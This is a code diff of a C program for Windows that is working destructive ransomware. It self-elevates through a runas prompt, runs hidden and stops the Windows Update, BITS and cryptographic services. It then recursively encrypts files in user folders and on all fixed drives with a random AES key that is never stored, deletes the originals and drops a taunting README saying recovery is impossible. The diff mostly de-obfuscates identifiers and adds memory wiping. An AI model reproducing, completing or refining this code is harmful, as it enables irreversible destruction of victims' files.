@@ -12,89 +12,85 @@
 #include <bcrypt.h>
 #include <threadpoolapiset.h>
 
-#define VAR1 4096
-
-#define X(s) (s[0]^s[1])
-#define XSTR(s) X(s), s[1]
-
-#define _str(s) #s
-#define obf_str(s) _str(XSTR(s))
+#define BUF_SIZE 65536
 
 typedef struct {
-    char *VAR2;
-    unsigned char VAR3[32];
-    unsigned char VAR4[16];
+    char* p1;
+    unsigned char p2[32];
+    unsigned char p3[16];
 } CustomStruct;
 
-void FUNC1(const char *VAR5, const unsigned char *VAR6, const unsigned char *VAR7);
-void FUNC2(const char *VAR8, const unsigned char *VAR6, const unsigned char *VAR7, int VAR9);
-int FUNC3();
-void FUNC4();
-void FUNC5(unsigned char *VAR10, size_t VAR11);
-void FUNC6(unsigned char *VAR6, unsigned char *VAR7);
-void FUNC7(unsigned char *VAR6, unsigned char *VAR7);
+void func1(const char* p4, const unsigned char* p2, const unsigned char* p3);
+void func2(const char* p5, const unsigned char* p2, const unsigned char* p3, int p6);
+int func3();
+void func4();
+void func5(unsigned char* p7, size_t p8);
+void func6(unsigned char* p2, unsigned char* p3);
+void func7(unsigned char* p2, unsigned char* p3);
 
-TP_CALLBACK_ENVIRON OTH1;
-PTP_POOL OTH2;
-PTP_CLEANUP_GROUP OTH3;
+TP_CALLBACK_ENVIRON tpoolEnv;
+PTP_POOL tpool;
+PTP_CLEANUP_GROUP tpoolCleanupGroup;
 
-void CALLBACK OTH4(PTP_CALLBACK_INSTANCE instance, PVOID context, PTP_WORK work) {
-    CustomStruct *VAR12 = (CustomStruct *)context;
-    FUNC1(VAR12->VAR2, VAR12->VAR3, VAR12->VAR4);
-    free(VAR12->VAR2);
-    free(VAR12);
+void CALLBACK tpoolCallback(PTP_CALLBACK_INSTANCE instance, PVOID context, PTP_WORK work) {
+    CustomStruct* p9 = (CustomStruct*)context;
+    func1(p9->p1, p9->p2, p9->p3);
+    SecureZeroMemory(p9->p1, strlen(p9->p1));
+    free(p9->p1);
+    SecureZeroMemory(p9, sizeof(CustomStruct));
+    free(p9);
 }
 
-void FUNC8() {
-    OTH2 = CreateThreadpool(NULL);
-    if (!OTH2) {
+void initThreadPool() {
+    tpool = CreateThreadpool(NULL);
+    if (!tpool) {
         printf("tpcf: %d\n", GetLastError());
         exit(1);
     }
 
-    OTH3 = CreateThreadpoolCleanupGroup();
-    if (!OTH3) {
+    tpoolCleanupGroup = CreateThreadpoolCleanupGroup();
+    if (!tpoolCleanupGroup) {
         printf("pf: %d\n", GetLastError());
-        CloseThreadpool(OTH2);
+        CloseThreadpool(tpool);
         exit(1);
     }
 
-    InitializeThreadpoolEnvironment(&OTH1);
-    SetThreadpoolCallbackPool(&OTH1, OTH2);
-    SetThreadpoolCallbackCleanupGroup(&OTH1, OTH3, NULL);
+    InitializeThreadpoolEnvironment(&tpoolEnv);
+    SetThreadpoolCallbackPool(&tpoolEnv, tpool);
+    SetThreadpoolCallbackCleanupGroup(&tpoolEnv, tpoolCleanupGroup, NULL);
 }
 
-void FUNC9() {
-    CloseThreadpoolCleanupGroupMembers(OTH3, FALSE, NULL);
-    CloseThreadpoolCleanupGroup(OTH3);
-    CloseThreadpool(OTH2);
+void cleanupThreadPool() {
+    CloseThreadpoolCleanupGroupMembers(tpoolCleanupGroup, FALSE, NULL);
+    CloseThreadpoolCleanupGroup(tpoolCleanupGroup);
+    CloseThreadpool(tpool);
 }
 
-int FUNC10() {
-    BOOL VAR13 = FALSE;
-    PSID VAR14;
-    SID_IDENTIFIER_AUTHORITY VAR15 = SECURITY_NT_AUTHORITY;
+int checkAdmin() {
+    BOOL isAdmin = FALSE;
+    PSID pSID;
+    SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;
 
-    if (AllocateAndInitializeSid(&VAR15, 2, SECURITY_BUILTIN_DOMAIN_RID,
-                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &VAR14)) {
-        CheckTokenMembership(NULL, VAR14, &VAR13);
-        FreeSid(VAR14);
+    if (AllocateAndInitializeSid(&SIDAuth, 2, SECURITY_BUILTIN_DOMAIN_RID,
+        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSID)) {
+        CheckTokenMembership(NULL, pSID, &isAdmin);
+        FreeSid(pSID);
     }
-    return VAR13;
+    return isAdmin;
 }
 
-void FUNC11() {
-    if (!FUNC10()) {
-        TCHAR VAR16[MAX_PATH];
-        if (GetModuleFileName(NULL, VAR16, ARRAYSIZE(VAR16))) {
-            SHELLEXECUTEINFO VAR17 = { sizeof(VAR17) };
-            VAR17.lpVerb = _T("runas");
-            VAR17.lpFile = VAR16;
-            VAR17.lpParameters = _T("--food");
-            VAR17.hwnd = NULL;
-            VAR17.nShow = SW_HIDE;
+void elevatePrivileges() {
+    if (!checkAdmin()) {
+        TCHAR szPath[MAX_PATH];
+        if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath))) {
+            SHELLEXECUTEINFO sei = { sizeof(sei) };
+            sei.lpVerb = _T("runas");
+            sei.lpFile = szPath;
+            sei.lpParameters = _T("--food");
+            sei.hwnd = NULL;
+            sei.nShow = SW_HIDE;
 
-            if (!ShellExecuteEx(&VAR17)) {
+            if (!ShellExecuteEx(&sei)) {
                 exit(1);
             }
             exit(0);
@@ -102,310 +98,316 @@ void FUNC11() {
     }
 }
 
-void FUNC12() {
-    SC_HANDLE VAR18 = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (VAR18) {
-        const char *VAR19[] = { "wuauserv", "bits", "cryptsvc" };
-        for (int VAR20 = 0; VAR20 < sizeof(VAR19) / sizeof(VAR19[0]); VAR20++) {
-            SC_HANDLE VAR21 = OpenService(VAR18, VAR19[VAR20], SERVICE_STOP | SERVICE_QUERY_STATUS);
-            if (VAR21) {
-                SERVICE_STATUS VAR22;
-                if (ControlService(VAR21, SERVICE_CONTROL_STOP, &VAR22)) {
-                    printf("s %s st.\n", VAR19[VAR20]);
+void stopServices() {
+    SC_HANDLE scMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (scMgr) {
+        const char* services[] = { "wuauserv", "bits", "cryptsvc" };
+        for (int i = 0; i < sizeof(services) / sizeof(services[0]); i++) {
+            SC_HANDLE svc = OpenService(scMgr, services[i], SERVICE_STOP | SERVICE_QUERY_STATUS);
+            if (svc) {
+                SERVICE_STATUS svcStatus;
+                if (ControlService(svc, SERVICE_CONTROL_STOP, &svcStatus)) {
+                    printf("s %s st.\n", services[i]);
                 }
-                CloseServiceHandle(VAR21);
+                CloseServiceHandle(svc);
             }
         }
-        CloseServiceHandle(VAR18);
+        CloseServiceHandle(scMgr);
     }
 }
 
-void FUNC1(const char *VAR5, const unsigned char *VAR6, const unsigned char *VAR7) {
-    char VAR23[MAX_PATH];
-    GetModuleFileName(NULL, VAR23, MAX_PATH);
-    if (strstr(VAR5, obf_str(".exe")) || _stricmp(VAR5, VAR23) == 0) {
+void func1(const char* p4, const unsigned char* p2, const unsigned char* p3) {
+    char modPath[MAX_PATH];
+    GetModuleFileName(NULL, modPath, MAX_PATH);
+    if (strstr(p4, ".exe") || _stricmp(p4, modPath) == 0) {
         return;
     }
 
-    FILE *VAR24 = fopen(VAR5, "rb");
-    if (!VAR24) return;
+    FILE* inFile = fopen(p4, "rb");
+    if (!inFile) return;
 
-    char VAR25[256];
-    snprintf(VAR25, sizeof(VAR25), "%s.smert", VAR5);
+    char outFilePath[256];
+    snprintf(outFilePath, sizeof(outFilePath), "%s.smert", p4);
 
-    FILE *VAR26 = fopen(VAR25, "wb");
-    if (!VAR26) {
-        fclose(VAR24);
+    FILE* outFile = fopen(outFilePath, "wb");
+    if (!outFile) {
+        fclose(inFile);
         return;
     }
 
-    HCRYPTPROV VAR27;
-    HCRYPTKEY VAR28;
-    HCRYPTHASH VAR29;
+    HCRYPTPROV hProv;
+    HCRYPTKEY hKey;
+    HCRYPTHASH hHash;
 
-    if (!CryptAcquireContext(&VAR27, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
-        fclose(VAR24);
-        fclose(VAR26);
+    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+        fclose(inFile);
+        fclose(outFile);
         return;
     }
 
-    if (!CryptCreateHash(VAR27, CALG_SHA_256, 0, 0, &VAR29)) {
-        CryptReleaseContext(VAR27, 0);
-        fclose(VAR24);
-        fclose(VAR26);
+    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
+        CryptReleaseContext(hProv, 0);
+        fclose(inFile);
+        fclose(outFile);
         return;
     }
 
-    if (!CryptHashData(VAR29, VAR6, 32, 0)) {
-        CryptDestroyHash(VAR29);
-        CryptReleaseContext(VAR27, 0);
-        fclose(VAR24);
-        fclose(VAR26);
+    if (!CryptHashData(hHash, p2, 32, 0)) {
+        CryptDestroyHash(hHash);
+        CryptReleaseContext(hProv, 0);
+        fclose(inFile);
+        fclose(outFile);
         return;
     }
 
-    if (!CryptDeriveKey(VAR27, CALG_AES_256, VAR29, 0, &VAR28)) {
-        CryptDestroyHash(VAR29);
-        CryptReleaseContext(VAR27, 0);
-        fclose(VAR24);
-        fclose(VAR26);
+    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
+        CryptDestroyHash(hHash);
+        CryptReleaseContext(hProv, 0);
+        fclose(inFile);
+        fclose(outFile);
         return;
     }
 
-    CryptDestroyHash(VAR29);
+    CryptDestroyHash(hHash);
 
-    if (!CryptSetKeyParam(VAR28, KP_IV, VAR7, 0)) {
-        CryptDestroyKey(VAR28);
-        CryptReleaseContext(VAR27, 0);
-        fclose(VAR24);
-        fclose(VAR26);
+    if (!CryptSetKeyParam(hKey, KP_IV, p3, 0)) {
+        CryptDestroyKey(hKey);
+        CryptReleaseContext(hProv, 0);
+        fclose(inFile);
+        fclose(outFile);
         return;
     }
 
-    unsigned char VAR30[VAR1];
-    unsigned char VAR31[VAR1 + 16];
-    DWORD VAR32, VAR33;
+    unsigned char buf[BUF_SIZE];
+    unsigned char encBuf[BUF_SIZE + 16];
+    DWORD bytesRead, bytesWritten;
 
-    while ((VAR32 = fread(VAR30, 1, VAR1, VAR24)) > 0) {
-        VAR33 = VAR32;
-        if (!CryptEncrypt(VAR28, 0, feof(VAR24), 0, VAR31, &VAR33, sizeof(VAR31))) {
-            CryptDestroyKey(VAR28);
-            CryptReleaseContext(VAR27, 0);
-            fclose(VAR24);
-            fclose(VAR26);
+    while ((bytesRead = fread(buf, 1, BUF_SIZE, inFile)) > 0) {
+        bytesWritten = bytesRead;
+        if (!CryptEncrypt(hKey, 0, feof(inFile), 0, encBuf, &bytesWritten, sizeof(encBuf))) {
+            CryptDestroyKey(hKey);
+            CryptReleaseContext(hProv, 0);
+            fclose(inFile);
+            fclose(outFile);
             return;
         }
-        fwrite(VAR31, 1, VAR33, VAR26);
+        fwrite(encBuf, 1, bytesWritten, outFile);
     }
 
-    CryptDestroyKey(VAR28);
-    CryptReleaseContext(VAR27, 0);
+    CryptDestroyKey(hKey);
+    CryptReleaseContext(hProv, 0);
 
-    fclose(VAR24);
-    fclose(VAR26);
+    fclose(inFile);
+    fclose(outFile);
 
-    remove(VAR5);
+    remove(p4);
 }
 
-int FUNC13(const char *VAR8) {
-    char VAR34[256];
-    snprintf(VAR34, sizeof(VAR34), "%s\\README.txt", VAR8);
-    struct stat VAR35;
-    return (stat(VAR34, &VAR35) == 0);
+int readmeExists(const char* p5) {
+    char rPath[256];
+    snprintf(rPath, sizeof(rPath), "%s\\README.txt", p5);
+    struct stat buffer;
+    return (stat(rPath, &buffer) == 0);
 }
 
-void FUNC14(const char *VAR8) {
-    if (FUNC13(VAR8)) {
+void createReadme(const char* p5) {
+    if (readmeExists(p5)) {
         return;
     }
-    char VAR34[256];
-    snprintf(VAR34, sizeof(VAR34), "%s\\README.txt", VAR8);
+    char rPath[256];
+    snprintf(rPath, sizeof(rPath), "%s\\README.txt", p5);
 
-    FILE *VAR36 = fopen(VAR34, "w");
-    if (VAR36) {
-        fprintf(VAR36, "Hello.\n Well, you got fucked. more specifically your files are.\nThere's no way to recover the files cuz im not gonna be a retard and demand shit.\n");
-        fclose(VAR36);
+    FILE* readme = fopen(rPath, "w");
+    if (readme) {
+        fprintf(readme, "Hello.\n Well, you got fucked. more specifically your files are.\nThere's no way to recover the files cuz im not gonna be a retard and demand shit.\n");
+        fclose(readme);
     }
 }
 
-int FUNC15(const char *VAR8) {
-    const char *VAR37[] = {
+int checkSystemDir(const char* p5) {
+    const char* sysDirs[] = {
         "C:\\Windows",
         "C:\\Users\\Default",
         "C:\\Users\\Public",
         NULL
     };
 
-    for (int VAR20 = 0; VAR37[VAR20] != NULL; VAR20++) {
-        if (_stricmp(VAR8, VAR37[VAR20]) == 0) {
+    for (int i = 0; sysDirs[i] != NULL; i++) {
+        if (_stricmp(p5, sysDirs[i]) == 0) {
             return 1;
         }
     }
     return 0;
 }
 
-int FUNC16() {
-    MEMORYSTATUSEX VAR38;
-    VAR38.dwLength = sizeof(VAR38);
-    GlobalMemoryStatusEx(&VAR38);
+int checkMemory() {
+    MEMORYSTATUSEX memStatus;
+    memStatus.dwLength = sizeof(memStatus);
+    GlobalMemoryStatusEx(&memStatus);
 
-    if (VAR38.dwMemoryLoad > 80) {
+    if (memStatus.dwMemoryLoad > 80) {
         return 0;
     }
 
-    FILETIME VAR39, VAR40, VAR41;
-    if (GetSystemTimes(&VAR39, &VAR40, &VAR41)) {
-        static ULARGE_INTEGER VAR42 = { 0 };
-        static ULARGE_INTEGER VAR43 = { 0 };
-        static ULARGE_INTEGER VAR44 = { 0 };
+    FILETIME idleTime, kernelTime, userTime;
+    if (GetSystemTimes(&idleTime, &kernelTime, &userTime)) {
+        static ULARGE_INTEGER prevIdleTime = { 0 };
+        static ULARGE_INTEGER prevKernelTime = { 0 };
+        static ULARGE_INTEGER prevUserTime = { 0 };
 
-        ULARGE_INTEGER VAR45, VAR46, VAR47;
+        ULARGE_INTEGER currIdleTime, currKernelTime, currUserTime;
 
-        VAR45.LowPart = VAR39.dwLowDateTime;
-        VAR45.HighPart = VAR39.dwHighDateTime;
-        VAR46.LowPart = VAR40.dwLowDateTime;
-        VAR46.HighPart = VAR40.dwHighDateTime;
-        VAR47.LowPart = VAR41.dwLowDateTime;
-        VAR47.HighPart = VAR41.dwHighDateTime;
+        currIdleTime.LowPart = idleTime.dwLowDateTime;
+        currIdleTime.HighPart = idleTime.dwHighDateTime;
+        currKernelTime.LowPart = kernelTime.dwLowDateTime;
+        currKernelTime.HighPart = kernelTime.dwHighDateTime;
+        currUserTime.LowPart = userTime.dwLowDateTime;
+        currUserTime.HighPart = userTime.dwHighDateTime;
 
-        ULONGLONG VAR48 = VAR45.QuadPart - VAR42.QuadPart;
-        ULONGLONG VAR49 = VAR46.QuadPart - VAR43.QuadPart;
-        ULONGLONG VAR50 = VAR47.QuadPart - VAR44.QuadPart;
+        ULONGLONG idleDiff = currIdleTime.QuadPart - prevIdleTime.QuadPart;
+        ULONGLONG kernelDiff = currKernelTime.QuadPart - prevKernelTime.QuadPart;
+        ULONGLONG userDiff = currUserTime.QuadPart - prevUserTime.QuadPart;
 
-        ULONGLONG VAR51 = VAR49 + VAR50;
-        double VAR52 = (VAR51 - VAR48) * 100.0 / VAR51;
+        ULONGLONG totalDiff = kernelDiff + userDiff;
+        double cpuUsage = (totalDiff - idleDiff) * 100.0 / totalDiff;
 
-        VAR42 = VAR45;
-        VAR43 = VAR46;
-        VAR44 = VAR47;
+        prevIdleTime = currIdleTime;
+        prevKernelTime = currKernelTime;
+        prevUserTime = currUserTime;
 
-        return VAR52 < 80;
+        return cpuUsage < 80;
     }
 
     return 1;
 }
 
-void FUNC2(const char *VAR8, const unsigned char *VAR6, const unsigned char *VAR7, int VAR9) {
-    WIN32_FIND_DATA VAR53;
-    HANDLE VAR54;
-    char VAR55[512];
-    char VAR56[512];
+void func2(const char* p5, const unsigned char* p2, const unsigned char* p3, int p6) {
+    WIN32_FIND_DATA findData;
+    HANDLE hFind;
+    char searchPath[512];
+    char fullPath[512];
 
-    if (FUNC15(VAR8)) {
+    if (checkSystemDir(p5)) {
         return;
     }
 
-    snprintf(VAR55, sizeof(VAR55), "%s\\*", VAR8);
-    VAR54 = FindFirstFile(VAR55, &VAR53);
+    snprintf(searchPath, sizeof(searchPath), "%s\\*", p5);
+    hFind = FindFirstFile(searchPath, &findData);
 
-    if (VAR54 == INVALID_HANDLE_VALUE) {
+    if (hFind == INVALID_HANDLE_VALUE) {
         return;
     }
 
     do {
-        if (strcmp(VAR53.cFileName, ".") != 0 && strcmp(VAR53.cFileName, "..") != 0) {
-            snprintf(VAR56, sizeof(VAR56), "%s\\%s", VAR8, VAR53.cFileName);
+        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
+            snprintf(fullPath, sizeof(fullPath), "%s\\%s", p5, findData.cFileName);
 
-            if (VAR53.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                if (VAR9 < 3) {
-                    FUNC2(VAR56, VAR6, VAR7, VAR9 + 1);
+            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                if (p6 < 3) {
+                    func2(fullPath, p2, p3, p6 + 1);
                 }
-            } else {
-                const char *VAR57 = strrchr(VAR53.cFileName, '.');
-                if (!FUNC13(VAR8) && (VAR57 == NULL || _stricmp(VAR57, ".lnk") != 0)) {
-                    FUNC14(VAR8);
+            }
+            else {
+                const char* fileExtension = strrchr(findData.cFileName, '.');
+                if (!readmeExists(p5) && (fileExtension == NULL || _stricmp(fileExtension, ".lnk") != 0)) {
+                    createReadme(p5);
                 }
 
-                CustomStruct *VAR12 = (CustomStruct *)malloc(sizeof(CustomStruct));
-                VAR12->VAR2 = _strdup(VAR56);
-                memcpy(VAR12->VAR3, VAR6, 32);
-                memcpy(VAR12->VAR4, VAR7, 16);
+                CustomStruct* p9 = (CustomStruct*)malloc(sizeof(CustomStruct));
+                p9->p1 = _strdup(fullPath);
+                memcpy(p9->p2, p2, 32);
+                memcpy(p9->p3, p3, 16);
 
-                PTP_WORK VAR58 = CreateThreadpoolWork(OTH4, VAR12, &OTH1);
-                if (VAR58) {
-                    SubmitThreadpoolWork(VAR58);
-                } else {
-                    free(VAR12->VAR2);
-                    free(VAR12);
+                PTP_WORK work = CreateThreadpoolWork(tpoolCallback, p9, &tpoolEnv);
+                if (work) {
+                    SubmitThreadpoolWork(work);
+                }
+                else {
+                    SecureZeroMemory(p9->p1, strlen(p9->p1));
+                    free(p9->p1);
+                    SecureZeroMemory(p9, sizeof(CustomStruct));
+                    free(p9);
                 }
             }
         }
-    } while (FindNextFile(VAR54, &VAR53) != 0);
+    } while (FindNextFile(hFind, &findData) != 0);
 
-    FindClose(VAR54);
+    FindClose(hFind);
 }
 
-void FUNC17(const unsigned char *VAR6, const unsigned char *VAR7, int VAR9) {
-    KNOWNFOLDERID VAR59[] = { FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Pictures, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Contacts, FOLDERID_Favorites, FOLDERID_Links, FOLDERID_SavedGames, GUID_NULL };
-    PWSTR VAR60;
+void processFiles(const unsigned char* p2, const unsigned char* p3, int p6) {
+    KNOWNFOLDERID folders[] = { FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Pictures, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Contacts, FOLDERID_Favorites, FOLDERID_Links, FOLDERID_SavedGames, GUID_NULL };
+    PWSTR folderPath;
 
-    for (int VAR20 = 0; !IsEqualGUID(&VAR59[VAR20], &GUID_NULL); VAR20++) {
-        if (SHGetKnownFolderPath(&VAR59[VAR20], 0, NULL, &VAR60) == S_OK) {
-            char VAR61[MAX_PATH];
-            wcstombs(VAR61, VAR60, MAX_PATH);
-            FUNC2(VAR61, VAR6, VAR7, VAR9);
-            CoTaskMemFree(VAR60);
+    for (int i = 0; !IsEqualGUID(&folders[i], &GUID_NULL); i++) {
+        if (SHGetKnownFolderPath(&folders[i], 0, NULL, &folderPath) == S_OK) {
+            char dirPath[MAX_PATH];
+            wcstombs(dirPath, folderPath, MAX_PATH);
+            func2(dirPath, p2, p3, p6);
+            CoTaskMemFree(folderPath);
         }
     }
 
-    for (char VAR62 = 'A'; VAR62 <= 'Z'; VAR62++) {
-        char VAR63[4] = { VAR62, ':', '\\', '\0' };
-        if (GetDriveType(VAR63) == DRIVE_FIXED) {
-            FUNC2(VAR63, VAR6, VAR7, VAR9);
+    for (char drive = 'A'; drive <= 'Z'; drive++) {
+        char rootPath[4] = { drive, ':', '\\', '\0' };
+        if (GetDriveType(rootPath) == DRIVE_FIXED) {
+            func2(rootPath, p2, p3, p6);
         }
     }
 }
 
-void FUNC5(unsigned char *VAR10, size_t VAR11) {
-    for (size_t VAR20 = 0; VAR20 < VAR11; VAR20++) {
-        VAR10[VAR20] ^= 0xAA;
+void xorEncrypt(unsigned char* p7, size_t p8) {
+    for (size_t i = 0; i < p8; i++) {
+        p7[i] ^= 0xAA;
     }
 }
 
-void FUNC6(unsigned char *VAR6, unsigned char *VAR7) {
-    HCRYPTPROV VAR27;
-    if (CryptAcquireContext(&VAR27, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
-        CryptGenRandom(VAR27, 32, VAR6);
-        CryptGenRandom(VAR27, 16, VAR7);
-        CryptReleaseContext(VAR27, 0);
+void generateKeys(unsigned char* p2, unsigned char* p3) {
+    HCRYPTPROV hProv;
+    if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
+        CryptGenRandom(hProv, 32, p2);
+        CryptGenRandom(hProv, 16, p3);
+        CryptReleaseContext(hProv, 0);
 
-        FUNC5(VAR6, 32);
-        FUNC5(VAR7, 16);
-    } else {
+        xorEncrypt(p2, 32);
+        xorEncrypt(p3, 16);
+    }
+    else {
         exit(1);
     }
 }
 
-void FUNC7(unsigned char *VAR6, unsigned char *VAR7) {
-    FUNC5(VAR6, 32);
-    FUNC5(VAR7, 16);
+void decryptKeys(unsigned char* p2, unsigned char* p3) {
+    xorEncrypt(p2, 32);
+    xorEncrypt(p3, 16);
 }
 
-int main(int VAR64, char *VAR65[]) {
-    if (VAR64 < 2) {
-        FUNC11();
-        ShellExecute(NULL, "open", VAR65[0], "--food", NULL, SW_HIDE);
+int main(int argc, char* argv[]) {
+    if (argc < 2) {
+        elevatePrivileges();
+        ShellExecute(NULL, "open", argv[0], "--food", NULL, SW_HIDE);
         return 0;
     }
 
-    unsigned char VAR6[32];
-    unsigned char VAR7[16];
+    unsigned char p2[32];
+    unsigned char p3[16];
 
-    FUNC6(VAR6, VAR7);
+    generateKeys(p2, p3);
 
-    FUNC12();
+    stopServices();
 
-    FUNC7(VAR6, VAR7);
+    decryptKeys(p2, p3);
 
-    FUNC8();
+    initThreadPool();
 
-    if (strcmp(VAR65[1], "--food") == 0) {
-        FUNC17(VAR6, VAR7, 0);
-    } else {
+    if (strcmp(argv[1], "--food") == 0) {
+        processFiles(p2, p3, 0);
+    }
+    else {
         return 1;
     }
 
-    FUNC9();
+    cleanupThreadPool();
 
     return 0;
 }
